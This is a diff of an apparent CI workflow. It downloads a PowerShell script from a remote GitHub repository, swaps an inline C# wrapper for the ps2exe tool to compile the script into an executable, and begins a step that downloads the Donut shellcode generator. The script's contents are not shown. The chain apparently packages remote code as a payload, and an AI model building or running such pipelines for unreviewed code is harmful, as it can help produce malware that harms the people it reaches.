@@ -17,27 +17,13 @@ jobs:
       run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -OutFile download.ps1
       shell: powershell
 
-    - name: Convert PS1 to EXE
-      run: |
-        $source = "download.ps1"
-        $target = "download.exe"
-        $code = Get-Content $source | Out-String
-        Add-Type -TypeDefinition @"
-        using System;
-        using System.Management.Automation;
-        public class Program {
-            public static void Main(string[] args) {
-                var script = @"
-        $code
-        "@;
-                using (var ps = PowerShell.Create()) {
-                    ps.AddScript(script).Invoke();
-                }
-            }
-        }
-        "@
-        [Program]::Main($null)
-      shell: powershell
+    - name: Install ps2exe module
+      run: Install-Module -Name ps2exe -Scope CurrentUser -Force -SkipPublisherCheck
+      shell: pwsh
+
+    - name: Convert PS1 to EXE using ps2exe
+      run: Invoke-ps2exe download.ps1 download.exe
+      shell: pwsh
 
     - name: Download Donut
       run: |
